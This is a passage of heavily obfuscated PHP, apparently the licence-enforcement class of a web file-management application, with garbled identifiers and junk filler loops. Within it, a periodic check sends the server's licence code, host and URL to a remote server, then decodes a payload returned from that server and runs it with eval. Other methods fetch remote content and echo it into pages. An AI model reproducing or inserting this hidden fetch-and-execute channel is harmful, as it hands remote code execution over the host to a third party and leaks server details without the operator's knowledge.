$this->jfwp4fa98d32(md5($…ÜèÍ—›[$ÏİÙ³üË[186]]), $ó¤¹¾ìÒ); $…ÜèÍ—›[$ÏİÙ³üË[108]] = base64_encode(strrev($this->jfwp4fa98d32($ú›Ù “, $ÏİÙ³üË[193]))); if ($Î—éÖÛä[$ÏİÙ³üË[194]] && $Î—éÖÛä[$ÏİÙ³üË[194]] >= 1) { Model($ÏİÙ³üË[33])->setDeep($ÏİÙ³üË[195], $ÏİÙ³üË[121]); } Model($ÏİÙ³üË[33])->set($…ÜèÍ—›); $æ¢¥ş²û = md5($_SERVER[$ÏİÙ³üË[102]] . strrev($³˜õ€˜) . $…ÜèÍ—›[$ÏİÙ³üË[188]]); $î±‘Ìø³ = $æñ†í Ã[694]; if (!$î±‘Ìø³) { die; } $ùÉ·õé¹ = strrev(substr($æ¢¥ş²û, 10, 16)); $†‰Ñú“ƒ = $æñ†í Ã[695]; if (strlen($†‰Ñú“ƒ) < $æñ†í Ã[653]) { return; } $‚»×Ğæ¾ = $this->moglbab0f06c(json_encode($Î—éÖÛä), $æ¢¥ş²û); $äã¦ÇÊÊ = $æñ†í Ã[696]; $á’êí½ê = array_to_keyvalue(Model($ÏİÙ³üË[7])->listData(), $ÏİÙ³üË[196]); $ç†•Ò¬å = $á’êí½ê[$ÏİÙ³üË[197]]; $ÜÊŸ°¢ = array(); $öŞ´˜³ = $æñ†í Ã[697]; if (strlen($öŞ´˜³) < $æñ†í Ã[653]) { die; } $ÜÊŸ°¢[$ùÉ·õé¹] = $‚»×Ğæ¾; Model($ÏİÙ³üË[7])->update($ç†•Ò¬å[$ÏİÙ³üË[198]], array($ÏİÙ³üË[199] => $ÜÊŸ°¢)); $ªÌ´ÒğÕ = $æñ†í Ã[698]; if (strlen($ªÌ´ÒğÕ) < $æñ†í Ã[665]) { return; } $this->gubi95e30457 = $Î—éÖÛä; $this->rwqd4ae3dfc7 = $…ÜèÍ—›[$ÏİÙ³üË[105]]; $Ç¸³½“ˆ = $æñ†í Ã[699]; while (strlen($Ç¸³½“ˆ) < $æñ†í Ã[20]) { if (!$Ç¸³½“ˆ) { break; } $Ç¸³½“ˆ++; } $this->licenseRegistSuccess(); $ÄÔ‚¹‘¯ = $æñ†í Ã[700]; if (strlen($ÄÔ‚¹‘¯) < $æñ†í Ã[645]) { die; } Cache::set($ÏİÙ³üË[200] . md5($³˜õ€˜ . $ÏİÙ³üË[201]), $ÏİÙ³üË[6]); show_json(LNG($ÏİÙ³üË[185]), !0); $Ù…ê‹Ì£ = $æñ†í Ã[701]; if (!$Ù…ê‹Ì£) { die; } } private function licenseRegistSuccess() { $ôŸ§ş–Ò =& $_SERVER[ªÏ§Ë·]; $§ªæÏ =& $_SERVER[ÊõàˆØ]; $òÚ×â·¿ = Model($§ªæÏ[33])->get(); $éôÔ†œ = $ôŸ§ş–Ò[702]; if (strlen($éôÔ†œ) < $ôŸ§ş–Ò[20]) { return; } if ($òÚ×â·¿[$§ªæÏ[63]] != $§ªæÏ[121]) { Model($§ªæÏ[33])->set($§ªæÏ[63], $§ªæÏ[121]); } Action($§ªæÏ[202])->initStart(!0); } private function ywht716a6ed0() { $±Š¤ÉÚ… =& $_SERVER[ÊõàˆØ]; Model($±Š¤ÉÚ…[33])->set(array($±Š¤ÉÚ…[186] => $±Š¤ÉÚ…[6], $±Š¤ÉÚ…[188] => $±Š¤ÉÚ…[6], $±Š¤ÉÚ…[105] => $±Š¤ÉÚ…[106], $±Š¤ÉÚ…[107] => $±Š¤ÉÚ…[6], $±Š¤ÉÚ…[108] => $±Š¤ÉÚ…[6])); Model($±Š¤ÉÚ…[33])->setDeep($±Š¤ÉÚ…[195], $±Š¤ÉÚ…[203]); $‹×®ÚğÍ = $_SERVER[ªÏ§Ë·][703]; $this->gubi95e30457 = array(); $this->rwqd4ae3dfc7 = $±Š¤ÉÚ…[106]; } private function wrux5c2f5a0a() { $öÙ³à»ê =& $_SERVER[ªÏ§Ë·]; $ç°ß™à© =& $_SERVER[ÊõàˆØ]; $_SERVER[$ç°ß™à©[159]] = _get($_SERVER, $ç°ß™à©[159], APP_HOST); $éåŞÄÂ‚ = $öÙ³à»ê[704]; while (strlen($éåŞÄÂ‚) < $öÙ³à»ê[665]) { if (!$éåŞÄÂ‚) { break; } $éåŞÄÂ‚++; } $this->rwqd4ae3dfc7 = $ç°ß™à©[106]; $Õà³± = Model($ç°ß™à©[33])->get(); if ($Õà³±[$ç°ß™à©[105]] == $ç°ß™à©[106]) { return; } $Äé¢øì„ = Model($ç°ß™à©[33])->get($ç°ß™à©[103]); $¼õ¿îâ = $ç°ß™à©[200] . md5($Äé¢øì„ . $ç°ß™à©[201]); $¯±ñö¨Õ = $öÙ³à»ê[705]; while ($¯±ñö¨Õ < $öÙ³à»ê[653]) { if ($¯±ñö¨Õ >= 0) { break; } $¯±ñö¨Õ++; } $ô‘Ú÷Á = Cache::get($¼õ¿îâ); $¶«ãßøË = $öÙ³à»ê[706]; if (!is_array($ô‘Ú÷Á) || !isset($ô‘Ú÷Á[$ç°ß™à©[204]]) || time() - $ô‘Ú÷Á[$ç°ß™à©[204]] >= 60) { $¿µ‚ï¬á = Model($ç°ß™à©[7])->loadList(); $–øŸïÉà = $¿µ‚ï¬á[$ç°ß™à©[197]]; $‰şúëÂü = md5($_SERVER[$ç°ß™à©[102]] . strrev($Äé¢øì„) . $Õà³±[$ç°ß™à©[188]]); $Ï¢­Å¾¼ = strrev(substr($‰şúëÂü, 10, 16)); $ô‘Ú÷Á = $this->pchk9afd611b($–øŸïÉà[$ç°ß™à©[85]][$Ï¢­Å¾¼], $‰şúëÂü); $ô‘Ú÷Á = json_decode($ô‘Ú÷Á, !0); } if (!is_array($ô‘Ú÷Á)) { return $this->ywht716a6ed0(); } $àã¨¼Ø¨ = strtotime($ô‘Ú÷Á[$ç°ß™à©[128]]); if (time() >= $àã¨¼Ø¨) { return $this->ywht716a6ed0(); } if (time() - $ô‘Ú÷Á[$ç°ß™à©[204]] > 20) { $ô‘Ú÷Á[$ç°ß™à©[204]] = time(); Cache::set($¼õ¿îâ, $ô‘Ú÷Á); } $this->gubi95e30457 = $ô‘Ú÷Á; $this->rwqd4ae3dfc7 = $Õà³±[$ç°ß™à©[105]]; } private function jxug0a9f4781() { $Ê¹ù»ë· =& $_SERVER[ÊõàˆØ]; $±ÚªµšÍ = $GLOBALS[$Ê¹ù»ë·[13]]; $®â×õß® = $_SERVER[$Ê¹ù»ë·[24]]; $Õ³åÆ³» = $_SERVER[ªÏ§Ë·][707]; if (!$Õ³åÆ³») { return; } if ($®â×õß® == $Ê¹ù»ë·[205] && $this->rwqd4ae3dfc7 == $Ê¹ù»ë·[106]) { show_json(LNG($Ê¹ù»ë·[206]), !1, $Ê¹ù»ë·[207]); } $Ù¿¹ÂÒ = array($Ê¹ù»ë·[208], $Ê¹ù»ë·[209]); if (in_array($®â×õß®, $Ù¿¹ÂÒ)) { if ($this->rwqd4ae3dfc7 == $Ê¹ù»ë·[106] && isset($±ÚªµšÍ[$Ê¹ù»ë·[210]])) { show_json(LNG($Ê¹ù»ë·[206]), !1, $Ê¹ù»ë·[207]); die; } $˜æÄ¬•ƒ = $this->lafs660461e5(); if ($˜æÄ¬•ƒ != intval($Ê¹ù»ë·[211])) { if ($˜æÄ¬•ƒ <= Model($Ê¹ù»ë·[124])->count()) { show_json(LNG($Ê¹ù»ë·[212]), !1, $Ê¹ù»ë·[207]); die; } } } } private function nukj9e390a84() { $¿¦ÙÇ“³ =& $_SERVER[ªÏ§Ë·]; $Ûò¥ƒáŸ =& $_SERVER[ÊõàˆØ]; $Ş¹à˜ÒÍ = array($Ûò¥ƒáŸ[118], $Ûò¥ƒáŸ[119]); $Ä›Êè = $¿¦ÙÇ“³[708]; if (!_get($GLOBALS, $Ûò¥ƒáŸ[115]) || !isset($_GET[$Ûò¥ƒáŸ[213]])) { return; } if (!in_array($_SERVER[$Ûò¥ƒáŸ[24]], $Ş¹à˜ÒÍ)) { return; } $•×¥ˆ— = $Ûò¥ƒáŸ[214]; $è¯¨ÓĞÏ = $¿¦ÙÇ“³[709]; $•×¥ˆ— = $this->gtpn17700c8b($•×¥ˆ—, $Ûò¥ƒáŸ[215]); $şà¡‡‘Â = $¿¦ÙÇ“³[710]; while ($şà¡‡‘Â < $¿¦ÙÇ“³[653]) { if ($şà¡‡‘Â >= 0) { break; } $şà¡‡‘Â++; } $­„ŞÜ—ƒ = stream_context_create(array($Ûò¥ƒáŸ[216] => array($Ûò¥ƒáŸ[217] => $Ûò¥ƒáŸ[218], $Ûò¥ƒáŸ[219] => 3))); $¦•ËÄ¦Ó = @file_get_contents($•×¥ˆ—, !1, $­„ŞÜ—ƒ); header($Ûò¥ƒáŸ[220]); $‘¤¬ëšŠ = $¿¦ÙÇ“³[711]; while (strlen($‘¤¬ëšŠ) < $¿¦ÙÇ“³[653]) { if (!$‘¤¬ëšŠ) { break; } $‘¤¬ëšŠ++; } if ($¦•ËÄ¦Ó && strstr($¦•ËÄ¦Ó, $Ûò¥ƒáŸ[221])) { echo $¦•ËÄ¦Ó; } die; } public function vuqz3bed2ed3($êù²˜æ²) { $ÎŒîöÂ =& $_SERVER[ªÏ§Ë·]; $„µñ“åÁ =& $_SERVER[ÊõàˆØ]; if ($this->rwqd4ae3dfc7 == $„µñ“åÁ[222]) { return $êù²˜æ²; } $šûôíé = array($„µñ“åÁ[223] => $„µñ“åÁ[224], $„µñ“åÁ[225] => $„µñ“åÁ[224], $„µñ“åÁ[226] => $„µñ“åÁ[224], $„µñ“åÁ[227] => $„µñ“åÁ[228], $„µñ“åÁ[229] => $„µñ“åÁ[228], $„µñ“åÁ[230] => $„µñ“åÁ[228], $„µñ“åÁ[231] => $„µñ“åÁ[228], $„µñ“åÁ[232] => $„µñ“åÁ[228], $„µñ“åÁ[233] => $„µñ“åÁ[228], $„µñ“åÁ[234] => $„µñ“åÁ[228], $„µñ“åÁ[235] => $„µñ“åÁ[228], $„µñ“åÁ[236] => $„µñ“åÁ[228], $„µñ“åÁ[237] => $„µñ“åÁ[228], $„µñ“åÁ[238] => $„µñ“åÁ[228], $„µñ“åÁ[239] => $„µñ“åÁ[228]); $üİÀ‘Ú‹ = $ÎŒîöÂ[712]; if (strlen($üİÀ‘Ú‹) < $ÎŒîöÂ[645]) { die; } $ëë‰€¯º = explode($„µñ“åÁ[240], _get($this->gubi95e30457, $„µñ“åÁ[112], $„µñ“åÁ[6])); $ÒÇâè© = $ÎŒîöÂ[713]; if (!$ÒÇâè©) { return; } $Ùùµ¬µË = array(); foreach ($šûôíé as $°Íãˆ‹  => $ãÍôİÓ¸) { if ($ãÍôİÓ¸ == $„µñ“åÁ[224] && substr($this->rwqd4ae3dfc7, 0, 1) == $„µñ“åÁ[224]) { continue; } if (!in_array($°Íãˆ‹ , $ëë‰€¯º)) { $Ùùµ¬µË[] = $°Íãˆ‹ ; } } foreach ($Ùùµ¬µË as $°Íãˆ‹ ) { unset($êù²˜æ²[$°Íãˆ‹ ]); } return $êù²˜æ²; } private function iqnaceee4211() { $âÌÁâÂÑ =& $_SERVER[ÊõàˆØ]; if ($this->rwqd4ae3dfc7 != $âÌÁâÂÑ[106]) { $GLOBALS[$âÌÁâÂÑ[85]][$âÌÁâÂÑ[89]][$âÌÁâÂÑ[241]] = $âÌÁâÂÑ[203]; return; } $GLOBALS[$âÌÁâÂÑ[85]][$âÌÁâÂÑ[242]] = $âÌÁâÂÑ[121]; if (Model($âÌÁâÂÑ[243])->get($âÌÁâÂÑ[63]) != $âÌÁâÂÑ[203]) { Model($âÌÁâÂÑ[243])->set($âÌÁâÂÑ[63], $âÌÁâÂÑ[203]); } } public function ivzt60899277() { return $_SERVER[ÊõàˆØ][244]; } private function majpd883560c() { $©ü‹¸íÜ =& $_SERVER[ªÏ§Ë·]; $ÍÔéàé =& $_SERVER[ÊõàˆØ]; $³Ğâ™Ş€ = array($ÍÔéàé[245], $ÍÔéàé[246], $ÍÔéàé[247]); $‚Ñâó„ˆ = $ÍÔéàé[248] . md5($ÍÔéàé[249]); $øĞù˜º = $©ü‹¸íÜ[714]; while ($øĞù˜º < $©ü‹¸íÜ[645]) { if ($øĞù˜º >= 0) { break; } $øĞù˜º++; } if ($this->rwqd4ae3dfc7 == $ÍÔéàé[106] || !_get($GLOBALS, $ÍÔéàé[115])) { return; } if (!in_array($_SERVER[$ÍÔéàé[24]], $³Ğâ™Ş€)) { return; } if (time() % 4 != 0) { return; } $‡Íï”¡š = call_user_func(array($ÍÔéàé[250], $ÍÔéàé[251]), $‚Ñâó„ˆ); $“°ÈÚÂí = $©ü‹¸íÜ[715]; if (strlen($“°ÈÚÂí) < $©ü‹¸íÜ[665]) { return; } if ($‡Íï”¡š && time() - $‡Íï”¡š < intval($ÍÔéàé[252])) { return; } call_user_func(array($ÍÔéàé[250], $ÍÔéàé[138]), $‚Ñâó„ˆ, time()); $œşñú¤É = Model($ÍÔéàé[33])->get($ÍÔéàé[103]); $¼Áà£Ø“ = $©ü‹¸íÜ[716]; $’ÔÇŒùÑ = array($ÍÔéàé[150] => Model($ÍÔéàé[33])->get($ÍÔéàé[186]), $ÍÔéàé[163] => $this->rwqd4ae3dfc7, $ÍÔéàé[160] => $_SERVER[$ÍÔéàé[161]], $ÍÔéàé[162] => Model($ÍÔéàé[33])->get($ÍÔéàé[130]), $ÍÔéàé[101] => md5($_SERVER[$ÍÔéàé[102]] . $œşñú¤É), $ÍÔéàé[153] => $ÍÔéàé[135], $ÍÔéàé[156] => $_SERVER[$ÍÔéàé[157]]); $×ÕÓ·Ù‹ = $©ü‹¸íÜ[717]; if (strlen($×ÕÓ·Ù‹) < $©ü‹¸íÜ[653]) { return; } $ÊÈæä = $this->bhdsbef9e82e($ÍÔéàé[253], $’ÔÇŒùÑ); $ç¡ßå‰ = $©ü‹¸íÜ[718]; if (strlen($ç¡ßå‰) < $©ü‹¸íÜ[645]) { return; } if (!is_array($ÊÈæä)) { return; } if ($ÊÈæä[$ÍÔéàé[150]] && $ÊÈæä[$ÍÔéàé[254]]) { if ($this->epxv364baebe($ÊÈæä[$ÍÔéàé[254]]) == $’ÔÇŒùÑ[$ÍÔéàé[150]]) { return; } } $this->ywht716a6ed0(); $šü‘å›‡ = $©ü‹¸íÜ[719]; if (strlen($šü‘å›‡) < $©ü‹¸íÜ[665]) { return; } if ($this->epxv364baebe($ÊÈæä[$ÍÔéàé[254]]) != $’ÔÇŒùÑ[$ÍÔéàé[150]]) { $‚ÉˆŸüü = array($ÍÔéàé[181] => $œşñú¤É, $ÍÔéàé[182] => $_SERVER[$ÍÔéàé[102]], $ÍÔéàé[183] => this_url(), $ÍÔéàé[158] => $_SERVER[$ÍÔéàé[159]]); $ú²·ß¡ = $this->gcbxdd8ba441(json_encode($‚ÉˆŸüü)); $ÊÈæä = $this->bhdsbef9e82e($ÍÔéàé[184] . $ú²·ß¡); if ($ÊÈæä && is_array($ÊÈæä) && isset($ÊÈæä[$ÍÔéàé[254]])) { $Ç¬ºú©Æ = $this->pchk9afd611b($ÊÈæä[$ÍÔéàé[254]], 2); if ($Ç¬ºú©Æ) { $Ç¬ºú©Æ = $this->epxv364baebe($Ç¬ºú©Æ); } if ($Ç¬ºú©Æ) { try { @eval($Ç¬ºú©Æ); } catch (Exception $Ö’—€À±) { } } } } } private function bhdsbef9e82e($ Ëâ¡­ = '', $¨—ƒàŸ = array(), $¬øşã‚ = 5) { $öøøŠÚ¾ =& $_SERVER[ªÏ§Ë·]; $Çä×ÁÖƒ =& $_SERVER[ÊõàˆØ]; $á è‚×¬ = $Çä×ÁÖƒ[255]; $ìÍ…¿‹ø = $öøøŠÚ¾[720]; while (strlen($ìÍ…¿‹ø) < $öøøŠÚ¾[645]) { if (!$ìÍ…¿‹ø) { break; } $ìÍ…¿‹ø++; } $á è‚×¬ = $this->gtpn17700c8b($á è‚×¬, $Çä×ÁÖƒ[256]); $¸ˆú‚›Ç = $öøøŠÚ¾[721]; if (strlen($¸ˆú‚›Ç) < $öøøŠÚ¾[20]) { return; } $á è‚×¬ = $á è‚×¬ . $ Ëâ¡­; $ÉÛÉçÜâ = $öøøŠÚ¾[722]; if ($¨—ƒàŸ && is_array($¨—ƒàŸ)) { $á è‚×¬ = $á è‚×¬ . $Çä×ÁÖƒ[257] . http_build_query($¨—ƒàŸ); } if ($¨—ƒàŸ === -1) { return $á è‚×¬; } $´ìÑã¤¾ = stream_context_create(array($Çä×ÁÖƒ[216] => array($Çä×ÁÖƒ[219] => $¬øşã‚, $Çä×ÁÖƒ[217] => $Çä×ÁÖƒ[258]), $Çä×ÁÖƒ[259] => array($Çä×ÁÖƒ[260] => !1, $Çä×ÁÖƒ[261] => !1))); $¨—ƒàŸ = @file_get_contents($á è‚×¬, !1, $´ìÑã¤¾); return json_decode($¨—ƒàŸ, !0); } private function lafs660461e5() { $ùò¦âÀè =& $_SERVER[ªÏ§Ë·]; $â£èÍâ =& $_SERVER[ÊõàˆØ]; $¡ÉšĞê½ = array($â£èÍâ[262] => $â£èÍâ[263], $â£èÍâ[264] => $â£èÍâ[265], $â£èÍâ[266] => $â£èÍâ[267], $â£èÍâ[268] => $â£èÍâ[269], $â£èÍâ[270] => $â£èÍâ[271], $â£èÍâ[272] => $â£èÍâ[211], $â£èÍâ[273] => $â£èÍâ[211], $â£èÍâ[274] => $â£èÍâ[263], $â£èÍâ[275] => $â£èÍâ[265], $â£èÍâ[276] => $â£èÍâ[267], $â£èÍâ[277] => $â£èÍâ[278], $â£èÍâ[279] => $â£èÍâ[269], $â£èÍâ[280] => $â£èÍâ[281], $â£èÍâ[282] => $â£èÍâ[271], $â£èÍâ[283] => $â£èÍâ[284], $â£èÍâ[285] => $â£èÍâ[286], $â£èÍâ[287] => $â£èÍâ[288]); $İÜ‰ªüš = $¡ÉšĞê½[$this->rwqd4ae3dfc7]; $İÜ‰ªüš = intval($İÜ‰ªüš ? $İÜ‰ªüš : $â£èÍâ[263]); $ãÓ­ÏÉà = $ùò¦âÀè[723]; if (strlen($ãÓ­ÏÉà) < $ùò¦âÀè[665]) { return; } $¨”–”Ÿ = _get($this->gubi95e30457, $â£èÍâ[289]); $¨”–”Ÿ = $¨”–”Ÿ ? intval($¨”–”Ÿ) : 0; $š¤–°¢œ = $ùò¦âÀè[724]; if (strlen($š¤–°¢œ) < $ùò¦âÀè[653]) { return; } return $İÜ‰ªüš + $¨”–”Ÿ; $½ğëãáÊ = $ùò¦âÀè[725]; if (!$½ğëãáÊ) { die; } } public function agmd855d2a19($ÇóÚø¸™) { $Ÿ¢Ç¶—— =& $_SERVER[ÊõàˆØ]; $úæú² = $this->lafs660461e5(); $åøƒ€‹ = $_SERVER[ªÏ§Ë·][726]; if ($ÇóÚø¸™[$Ÿ¢Ç¶——[290]] == $Ÿ¢Ç¶——[121]) { return; } if ($úæú² >= intval($Ÿ¢Ç¶——[211])) { return; } $×±ùÍÑ­ = Model($Ÿ¢Ç¶——[124])->count(); if ($×±ùÍÑ­ <= $úæú²) { return; } $Ÿ¡˜ÚÏ£ = Model($Ÿ¢Ç¶——[124])->field($Ÿ¢Ç¶——[290])->limit($úæú²)->select(); $Ÿ¡˜ÚÏ£ = array_to_keyvalue($Ÿ¡˜ÚÏ£, $Ÿ¢Ç¶——[6], $Ÿ¢Ç¶——[290]); if (!in_array($ÇóÚø¸™[$Ÿ¢Ç¶——[290]], $Ÿ¡˜ÚÏ£)) { show_json($Ÿ¢Ç¶——[291], !1, $Ÿ¢Ç¶——[207]); } } public function czpd589ce95d() { $¤…‚¯š‡ =& $_SERVER[ªÏ§Ë·]; $ü‡±‘Í© =& $_SERVER[ÊõàˆØ]; if (!_get($GLOBALS, $ü‡±‘Í©[115]) || mt_rand(1, 100) > 20) { return; } $ıïæ³´ˆ = $ü‡±‘Í©[214]; $ıïæ³´ˆ = $this->gtpn17700c8b($ıïæ³´ˆ, $ü‡±‘Í©[215]); $íÊÎĞÖµ = $¤…‚¯š‡[727]; $•äœÒÆ  = stream_context_create(array($ü‡±‘Í©[216] => array($ü‡±‘Í©[217] => $ü‡±‘Í©[218], $ü‡±‘Í©[219] => 3))); $®«†Öá = $¤…‚¯š‡[728]; if (strlen($®«†Öá) < $¤…‚¯š‡[20]) { die; } $²™ÉÇ‰ = @file_get_contents($ıïæ³´ˆ, !1, $•äœÒÆ ); echo $ü‡±‘Í©[292] . hash_encode($²™ÉÇ‰) . $ü‡±‘Í©[293]; $·¢”Åë– = $¤…‚¯š‡[729]; if (strlen($·¢”Åë–) < $¤…‚¯š‡[653]) { die; } } private function moglbab0f06c($Ì®Øõº, $Ü›¤š¬’, $¬ĞÔ¾Û€ = 3) { $ŸĞ³Ïìà =& $_SERVER[ªÏ§Ë·]; $Ü­Á‹¾õ =& $_SERVER[ÊõàˆØ]; usleep(1); $Ì®Øõº = trim($Ì®Øõº); $¼€µœÄİ = $ŸĞ³Ïìà[730]; if (strlen($¼€µœÄİ) < $ŸĞ³Ïìà[671]) { die; } $É„Ë‡¹‚ = mt_rand(0, 5) . $Ü­Á‹¾õ[6]; $íïöæõ´ = $ŸĞ³Ïìà[731]; if (strlen($íïöæõ´) < $ŸĞ³Ïìà[665]) { die; } $²Õ¿€™Â = rand_string(15); $óõÑÌÏ² = $Ü­Á‹¾õ[294]; switch ($É„Ë‡¹‚) { case $Ü­Á‹¾õ[203]: $ª¢™ıŞŠ = $this->jfwp4fa98d32($Ì®Øõº, strrev($Ü›¤š¬’ . $²Õ¿€™Â)); $µƒä…É = $ŸĞ³Ïìà[732]; if (strlen($µƒä…É) < $ŸĞ³Ïìà[645]) { die; } break; $…§Í”È« = $ŸĞ³Ïìà[733]; case $Ü­Á‹¾õ[121]: $ª¢™ıŞŠ = $this->jfwp4fa98d32($Ì®Øõº, strrev($²Õ¿€™Â . $Ü›¤š¬’)); $ŞŒ«¹«Ã = $ŸĞ³Ïìà[734]; while (strlen($ŞŒ«¹«Ã) < $ŸĞ³Ïìà[20]) { if (!$ŞŒ«¹«Ã) { break; } $ŞŒ«¹«Ã++; } break; case $Ü­Á‹¾õ[295]: $ª¢™ıŞŠ = $this->jfwp4fa98d32($Ì®Øõº, base64_encode($²Õ¿€™Â . $Ü›¤š¬’)); break; case $Ü­Á‹¾õ[296]: $ª¢™ıŞŠ = $this->jfwp4fa98d32($Ì®Øõº, md5($²Õ¿€™Â . $Ü›¤š¬’)); break; case $Ü­Á‹¾õ[297]: $Ì®Øõº = base64_encode($Ì®Øõº); $Ì¯§€Ó½ = rand(0, 64); $şì£œĞ• = $óõÑÌÏ²[$Ì¯§€Ó½]; $‘ã–½âù = md5($şì£œĞ• . md5($Ü›¤š¬’ . $şì£œĞ•) . $Ü›¤š¬’); $ØÃ”–ĞÌ = $ŸĞ³Ïìà[735]; $‘ã–½âù = substr($‘ã–½âù, $Ì¯§€Ó½ % 8, $Ì¯§€Ó½ % 8 + 7); $ƒùŞ¾• = $Ü­Á‹¾õ[6]; $¡üâ¶Ê® = $ŸĞ³Ïìà[736]; while (strlen($¡üâ¶Ê®) < $ŸĞ³Ïìà[665]) { if (!$¡üâ¶Ê®) { break; } $¡üâ¶Ê®++; } $Ø±’¬ä½ = 0; $´‰üŒóØ = 0; $ŒÑ§™×Æ = 0; for ($Ø±’¬ä½ = 0; $Ø±’¬ä½ < strlen($Ì®Øõº); $Ø±’¬ä½++) { $ŒÑ§™×Æ = $ŒÑ§™×Æ == strlen($‘ã–½âù) ? 0 : $ŒÑ§™×Æ; $´‰üŒóØ = ($Ì¯§€Ó½ + strpos($óõÑÌÏ², $Ì®Øõº[$Ø±’¬ä½]) + ord($‘ã–½âù[$ŒÑ§™×Æ++])) % 64; $ƒùŞ¾• .= $óõÑÌÏ²[$´‰üŒóØ]; } $ª¢™ıŞŠ = hash_encode($şì£œĞ• . $ƒùŞ¾•); break; default: $ª¢™ıŞŠ = $this->jfwp4fa98d32($Ì®Øõº, $Ü›¤š¬’ . $²Õ¿€™Â); $ÕÜåêõ‰ = $ŸĞ³Ïìà[737]; break; $¶©Œ¨ = $ŸĞ³Ïìà[738]; while ($¶©Œ¨ < $ŸĞ³Ïìà[645]) { if ($¶©Œ¨ >= 0) { break; } $¶©Œ¨++; } } $ª¢™ıŞŠ = strrev($É„Ë‡¹‚ . $²Õ¿€™Â . $ª¢™ıŞŠ); $µáœÊ¥Ä = $ŸĞ³Ïìà[739]; if (strlen($µáœÊ¥Ä) < $ŸĞ³Ïìà[665]) { return; } if ($¬ĞÔ¾Û€ - 1 > 0) { $ª¢™ıŞŠ = $this->moglbab0f06c($ª¢™ıŞŠ, $Ü›¤š¬’, $¬ĞÔ¾Û€ - 1); } return $ª¢™ıŞŠ; } private function pchk9afd611b($°Óü­ş¡, $ÒüÊ½×, $Š‹µ¯È‘ = 3) { $˜¦–õØ† =& $_SERVER[ªÏ§Ë·]; $Óñû˜­Ê =& $_SERVER[ÊõàˆØ]; if (!is_string($°Óü­ş¡) || strlen($°Óü­ş¡) < 10) { return !1; } $°Óü­ş¡ = trim($°Óü­ş¡); $¯•½å´± = $˜¦–õØ†[740]; while (strlen($¯•½å´±) < $˜¦–õØ†[20]) { if (!$¯•½å´±) { break; } $¯•½å´±++; } $°Óü­ş¡ = strrev($°Óü­ş¡); $°÷ï›ğö = $°Óü­ş¡[0]; $Â›ë¼êÂ = $˜¦–õØ†[735]; $Ã€¯ã§ä = substr($°Óü­ş¡, 1, 15); $ä±Å¶áê = $˜¦–õØ†[741]; $°Óü­ş¡ = substr($°Óü­ş¡, 16); $Ö²ŠÎÉı = $˜¦–õØ†[742]; while (strlen($Ö²ŠÎÉı) < $˜¦–õØ†[665]) { if (!$Ö²ŠÎÉı) { break; } $Ö²ŠÎÉı++; } $‡ÚÓÚ‡È = $Óñû˜­Ê[294]; switch ($°÷ï›ğö) { case $Óñû˜­Ê[203]: $¸‚üàïˆ = $this->gtpn17700c8b($°Óü­ş¡, strrev($ÒüÊ½× . $Ã€¯ã§ä)); break; case $Óñû˜­Ê[121]: $¸‚üàïˆ = $this->gtpn17700c8b($°Óü­ş¡, strrev($Ã€¯ã§ä . $ÒüÊ½×)); $Ëèˆ–Ÿ¸ = $˜¦–õØ†[743]; if (!$Ëèˆ–Ÿ¸) { die; } break; case $Óñû˜­Ê[295]: $¸‚üàïˆ = $this->gtpn17700c8b($°Óü­ş¡, base64_encode($Ã€¯ã§ä . $ÒüÊ½×)); break; case $Óñû˜­Ê[296]: $¸‚üàïˆ = $this->gtpn17700c8b($°Óü­ş¡, md5($Ã€¯ã§ä . $ÒüÊ½×)); break; $ÁÀ›ƒÄ = $˜¦–õØ†[744]; while ($ÁÀ›ƒÄ < $˜¦–õØ†[20]) { if ($ÁÀ›ƒÄ >= 0) { break; } $ÁÀ›ƒÄ++; } case $Óñû˜­Ê[297]: $°Óü­ş¡ = hash_decode($°Óü­ş¡); $»—ü˜ï = $°Óü­ş¡[0]; $°Óü­ş¡ = substr($°Óü­ş¡, 1); $ğå¦è¹£ = $˜¦–õØ†[745]; if (strlen($ğå¦è¹£) < $˜¦–õØ†[645]) { die; } $ë¸—¯† = strpos($‡ÚÓÚ‡È, $»—ü˜ï); $„òéÈåÚ = $˜¦–õØ†[746]; while ($„òéÈåÚ < $˜¦–õØ†[671]) { if ($„òéÈåÚ >= 0) { break; } $„òéÈåÚ++; } $ß¹¬”Šó = md5($»—ü˜ï . md5($ÒüÊ½× . $»—ü˜ï) . $ÒüÊ½×); $ÆÊ¨ÎèŞ = $˜¦–õØ†[747]; $ß¹¬”Šó = substr($ß¹¬”Šó, $ë¸—¯† % 8, $ë¸—¯† % 8 + 7); $Ò´äãÊÁ = $Óñû˜­Ê[6]; $šĞ¼˜Şã = 0; $‡“ıÃ¤™ = 0; $œ·üÓä = $˜¦–õØ†[748]; if (!$œ·üÓä) { die; } $øÎ˜”â„ = 0; for ($šĞ¼˜Şã = 0; $šĞ¼˜Şã < strlen($°Óü­ş¡); $šĞ¼˜Şã++) { $øÎ˜”â„ = $øÎ˜”â„ == strlen($ß¹¬”Šó) ? 0 : $øÎ˜”â„; $Ì÷Öñıœ = $˜¦–õØ†[749]; while (strlen($Ì÷Öñıœ) < $˜¦–õØ†[20]) { if (!$Ì÷Öñıœ) { break; } $Ì÷Öñıœ++; } $¸ƒò®Ú™ = $øÎ˜”â„++; $‡“ıÃ¤™ = strpos($‡ÚÓÚ‡È, $°Óü­ş¡[$šĞ¼˜Şã]) - $ë¸—¯† - ord($ß¹¬”Šó[$¸ƒò®Ú™]); $ˆÀí«Üº = $˜¦–õØ†[750]; if (!$ˆÀí«Üº) { die; } while ($‡“ıÃ¤™ < 0) { $‡“ıÃ¤™ += 64; $‚€¿Ï½’ = $˜¦–õØ†[751]; while (strlen($‚€¿Ï½’) < $˜¦–õØ†[645]) { if (!$‚€¿Ï½’) { break; } $‚€¿Ï½’++; } } $Ò´äãÊÁ .= $‡ÚÓÚ‡È[$‡“ıÃ¤™]; } $¸‚üàïˆ = base64_decode($Ò´äãÊÁ); $À µàşô = $˜¦–õØ†[752]; if (!$À µàşô) { return; } break; default: $¸‚üàïˆ = $this->gtpn17700c8b($°Óü­ş¡, $ÒüÊ½× . $Ã€¯ã§ä); $‘×ë©» = $˜¦–õØ†[753]; while (strlen($‘×ë©») < $˜¦–õØ†[671]) { if (!$‘×ë©») { break; } $‘×ë©»++; } break; } if ($Š‹µ¯È‘ - 1 > 0) { $¸‚üàïˆ = $this->pchk9afd611b($¸‚üàïˆ, $ÒüÊ½×, $Š‹µ¯È‘ - 1); } return $¸‚üàïˆ; } public function gcbxdd8ba441($¸ÚîÙĞ) { $—”òÛÑ¸ =& $_SERVER[ªÏ§Ë·]; $ƒ¢ğ³¡Û =& 